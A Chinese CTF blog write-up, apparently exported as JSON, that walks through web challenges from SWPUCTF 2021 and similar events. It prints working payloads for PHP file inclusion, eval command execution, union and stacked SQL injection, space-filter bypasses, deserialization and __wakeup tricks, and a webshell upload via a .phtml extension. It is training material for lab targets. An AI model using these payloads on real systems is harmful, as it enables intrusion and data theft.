[SWPUCTF 2021 新生赛]include打开环境显示让我们传一个file，盲猜是伪协议 先随便get传参一下file,随便赋值就可以然后看到题目源码 123456789101112131415161718 &lt;?phpini_set(&quot;allow_url_include&quot;,&quot;on&quot;);header(&quot;Content-type: text/html; charset=utf-8&quot;);error_reporting(0);$file=$_GET[&#x27;file&#x27;];if(isset($file))&#123; show_source(__FILE__); echo &#x27;flag 在flag.php中&#x27;;&#125;else&#123; echo &quot;传入一个file试试&quot;;&#125;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;echo &quot;&lt;/br&gt;&quot;;include_once($file);?&gt; flag 在flag.php中 php:&#x2F;&#x2F;filter伪协议知道在flag.php中，就直接伪协议 12?file=php://filter/read=convert.base64-encode/resource=flag.php//（针对php文件需要base64编码） [SWPUCTF 2021 新生赛]easyrce12345678 &lt;?phperror_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123;eval($_GET[&#x27;url&#x27;]);&#125;?&gt; 直接传参执行命令，payload如下 12?url=system(&quot;ls /&quot;);?url=system(&quot;cat /flllllaaaaaaggggggg&quot;); [SWPUCTF 2021 新生赛]easy_sql简单的sql注入，步骤完整，联合注入类型打开环境，看到网址上方有提示说参数是wllm payload如下： 12345678?wllm=1 //有回显，存在sql注入 ?wllm=-1&#x27; or 1=1--+ //为字符型注入?wllm=1&#x27; order by 3--+ //判断列数，3列不报错，4列报错，有3列?wllm=-1&#x27; union select 1,2,3--+ //判断显示位，发现回显2，3则2和3是回显位?wllm=-1&#x27; union select 1,database(),3--+ //查询数据库名字--test_db?wllm=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;test_db&#x27;--+ //查找表名回显 test_tb,users?wllm=-1%27%20union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;test_tb&#x27;--+ //查找字段，回显id和flag?wllm=-1&#x27; union select 1,group_concat(flag),3 from test_db.test_tb --+ //查找相应的数据 [第五空间 2021]WebFTP打开环境是一个登录页面，发现是webftf，一个老框架 框架的默认登录是admin/admin888 这道题的预期解是在github上下载源码，然后进行源码分析 访问下面这个路径，在phpinfo里找到flag/Readme/mytz.php?act=phpinfo 其实直接访问/phpinfo.php就可以了 [SWPUCTF 2021 新生赛]babyrce1234567891011&lt;?phperror_reporting(0);header(&quot;Content-Type:text/html;charset=utf-8&quot;);highlight_file(__FILE__);if($_COOKIE[&#x27;admin&#x27;]==1) &#123; include &quot;../next.php&quot;;&#125;else echo &quot;小饼干最好吃啦！&quot;;?&gt; payload如下 admin=1 //首先在cookie头传参，发现了rasalghul.php ，访问rasalghul.php内容如下： 12345678910111213 &lt;?phperror_reporting(0);highlight_file(__FILE__);error_reporting(0);if (isset($_GET[&#x27;url&#x27;])) &#123; $ip=$_GET[&#x27;url&#x27;]; if(preg_match(&quot;/ /&quot;, $ip))&#123; die(&#x27;nonono&#x27;); &#125; $a = shell_exec($ip); echo $a;&#125;?&gt; 看到这里有一个正则，他的意思是，输入的东西不能被目录分隔符包围，那对于我们的影响就是我们输入的payload里不能含有&#x2F;，payload如下（记住要一直保持cookie传参admin&#x3D;1) /rasalghul.php/?url=ls //回显 index.php rasalghul.php 过滤目录分割符&#x2F;的绕过目录分隔符的绕过，就用命令拼接 简单的原理就是，执行了第一个命令之后，接着就执行第二个命令，比如我们知道flag在flag_is_here这个文件夹的flag_xxx.php里，但是我们用不能用flag_is_here/cat flag_xxx.php，就可以用下面这个payload绕过 cd flag_is_here;cat flag_xxx.php 哟西，在我想怎么绕过的时候，我发现我搞错了，这里过滤的是空格，我就说怎么怎么输入都不对 过滤空格的绕过Linux下对空格的绕过： 1234567891011$&#123;IFS&#125;$IFS$9 //1-9都可以&lt;&gt;&lt;&gt;kg=$&#x27;\\x20flag.txt&#x27;&amp;&amp;cat$kg //(\\x20 转换成字符串就是空格，这里通过变量的方式巧妙绕过) URL绕过空格： 123%09%0a Windows绕过空格： （只有type这个命令可以用，type命令是打开某个文件的意思） （实用性不是很广，也就type这个命令可以用） 123.\\ //如type.\\flag.txt, // 如type,flag.txt 所以这道题的payload为 123/rasalghul.php/?url=ls/rasalghul.php/?url=ls$&#123;IFS&#125;/ //用$&#123;IFS&#125;绕过空格/rasalghul.php/?url=cat$&#123;IFS&#125;/flllllaaaaaaggggggg [陇剑杯 2021]签到这道题提醒是一道网络协议的流量分析，应该是flag文件藏在流量包中，我们需要分离flag文件 首先用wireshark打开pcapng附件,题目问可能是什么类型的攻击 直接猜http，发现就对了 NSSCTF&#123;http&#125; 但是如果找答案的话，那就统计-&gt;协议分级-&gt;然后看到http协议占比最多 [SWPUCTF 2021 新生赛]Do_you_know_http修改HTTP头的考察一些常见的需要修改http头的考察： 12345671.用....(地址，从本地登录）：**X-Forwarded-For**2. .发现 必须来自 的提示 : Referer3.使用...浏览器 : User-Agent4.管理员登录 ： 这个有一道题抓包之后有一个头是：cookie admin=0，然后我们改成1就可以了，要观察 应该就是考察Http头，点开环境，显示 1234567//Please use &#x27;WLLM&#x27; browser! 把User-Agent改成&#x27;WLLM&quot;/*You can only read this at local!Your address52.194.189.7*/添加X-Forwarded-For头，值为127.0.0.1 [SWPUCTF 2021 新生赛]ez_unserialize打开环境，是一个动图，F12查看源码，也没有什么有用的东西，那就来扫一下 扫到robots.txt和index.html两个文件，分别访问一下 发现提示，/cl45s.php，访问，得到源码 1234567891011121314151617181920212223242526272829&lt;?phperror_reporting(0);show_source(&quot;cl45s.php&quot;);class wllm&#123; public $admin; public $passwd; public function __construct()&#123; $this-&gt;admin =&quot;user&quot;; $this-&gt;passwd = &quot;123456&quot;; &#125; public function __destruct()&#123; if($this-&gt;admin === &quot;admin&quot; &amp;&amp; $this-&gt;passwd === &quot;ctf&quot;)&#123; include(&quot;flag.php&quot;); echo $flag; &#125;else&#123; echo $this-&gt;admin; echo $this-&gt;passwd; echo &quot;Just a bit more!&quot;; &#125; &#125;&#125;$p = $_GET[&#x27;p&#x27;];unserialize($p); poc为： 12345678&lt;?phpclass wllm&#123;public $admin=&quot;admin&quot;;public $passwd=&quot;ctf&quot;;&#125;$QW=new wllm();echo serialize($QW);?&gt; payload为： /cl45s.php/?p=O:4:&quot;wllm&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;&#125; [SWPUCTF 2021 新生赛]easyupload2.0打开环境是一个文件上传的界面，上传了一个图片马，显示上传成功，试试抓包修改后缀呢 但是改了之后，发现显示php是不行滴，所以php后缀不行 那如果php后缀不行的话，那就换个其他的后缀呗，可能黑名单过滤了php 文件上传php后缀的替代php3，php5，pht，phtml，phps都是php可运行的文件扩展名 那我们就再次抓包，把后缀改成phtml，这个后缀算是最常用的一个吧，这道题用pht也可以 上传成功，然后用蚁剑连接即可 （注意路径里不要加upload.php,直接http:.../upload/include.phtml [SWPUCTF 2021 新生赛]no_wakeup打开环境，看到源码 根据题目名字和代码，我们可以知道应该是要绕过__wakeup()魔术方法，因为如果触发了__wakeup()那我们传入的passwd的值就变了 反序列化绕过__wakeup__wakeup()魔术方法，在反序列化时会自动调用 绕过方法为： 序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行 （我们等会就拿这道题目举例子吧，但是就是这个绕过方法适用的php的版本比较低)适用版本： PHP5 &lt; 5.6.25 PHP7 &lt; 7.0.10 这里贴上一篇文章（里面讲了四五种绕过__wakeup的方法，如果是比较高版本的php的话，就可以参照这篇文章里的绕过方法） __wakeup的一些绕过方法 这道题我们的poc为： 12345678&lt;?phpclass HaHaHa&#123;public $admin=&quot;admin&quot;;public $passwd=&quot;wllm&quot;;&#125;$QW=new HaHaHa();echo serialize($QW);?&gt; payload为 12345//原来的：O:6:&quot;HaHaHa&quot;:2:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125;/*因为我们要让对象属性个数的值大于真实的属性个数，所以直接把后面的2改个比2大的数字就可以了*//?p=O:6:&quot;HaHaHa&quot;:6:&#123;s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;&#125; [suctf 2019]EasySQL打开环境，显示 12345678//在输入框内输入1 //有正常回显1&#x27; //无回显1&#x27; or &#x27;1&#x27;=&#x27;1&#x27;# //回显nonono,用and语句也是一样，应该是过滤了一些关键词//试了联合查询的语句全部报错了，这里我就有些懵了，去看了wp，然后发现是堆叠注入1;show databases# //查库1;show tables# //查表，发现flag，接下来就是怎么查看他的问题1;show columns from &#x27;Flag&#x27;# //这里是nonono 接下来看wp，说这道题是要去猜他的后端语句可能是什么样的 （下面的是网上的博主解释的） 输入非零数字得到的回显1和输入其余字符得不到回显&#x3D;&gt;来判断出内部的查询语句可能存在有||,即只有第一个命令成功执行，才会执行后面的命令 也就是select 输入的数据||内置的一个列名 from 表名即为后台语句为：select $post[&#39;query&#39;]||flag from Flag 测试语句：1 拼接效果为：select 1||flag from Flag 这里我们就需要输入$post[&#39;query&#39;] 关于sql_mode（摘抄于网上的博主，并非原创） 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的PIPES_AS_CONCAT将 ||视为字符串的连接操作符而非 “或” 运算符，所以当设置了sql_mode的PIPES_AS_CONCAT时候，||就相当于是concat()函数， 当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR函数 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接。 但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能 综上，我们的payload为 1234567891011*,1 //这是非预期的payload/*当我们输入上面的payload之后，后台的语句变成了select *,1||flag from Flag，就是select *,1 from Flag，这样就直接查询出了Flag表中的所有内容。此处的1是临时增加一列，列名为1且这一列的所有值都为1还有一个注意点，在这个模式下进行查询的时候，使用字母连接会报错，使用数字连接才会查询出数据，因为这个 || 相当于是将 select 1 和 select flag from flag 的结果拼接在一起*/1;set sql_mode=PIPES_AS_CONCAT;select 1 //这是预期的官方payload//如果没有加set sql_mode=PIPES_AS_CONCAT，那||在mysql中就会默认是或运算，即如果command1执行失败，则执行command2，但是由于开头是1，所以command1不可能执行失败，所以我们必须要set一下这个模式","categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"}],"tags":[],"author":"Qingwan"},{"title":"新滴开始","slug":"1","date":"2023-11-20T13:11:37.079Z","updated":"2024-01-08T07:56:12.546Z","comments":true,"path":"2023/11/20/1/","link":"","permalink":"https://qingwan.top/2023/11/20/1/","excerpt":"换博客之后的第一篇文章~ 新的开始啦","text":"换博客之后的第一篇文章~ 新的开始啦 鼠了，咱就是说上一个博客的数据库毙了，也想着每年换服务器什么的麻烦，就顺便这次把博客换成github搭建的了。 呜呜呜本来想着有备份数据库，大不了就把之前的几十篇文章重新传一遍，结果发现备份的数据看的我脑壳昏。所以之前的博客的文章大概率都不会完全恢复了，不过也好，之前的文章有很多都囫囵吞枣的。尽量把之前写的比较明白的文章放回来，以后也尽量都更自己弄明白的写的好的文章嘻嘻~ 加油~","categories":[{"name":"随笔","slug":"随笔","permalink":"https://qingwan.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[]}],"categories":[{"name":"CTF做题wp","slug":"CTF做题wp","permalink":"https://qingwan.top/categories/CTF%E5%81%9A%E9%A2%98wp/"},{"name":"渗透","slug":"渗透","permalink":"https://qingwan.top/categories/%E6%B8%97%E9%80%8F/"},{"name":"代码审计","slug":"代码审计","permalink":"https://qingwan.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"随笔","slug":"随笔","permalink":"https://qingwan.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[]}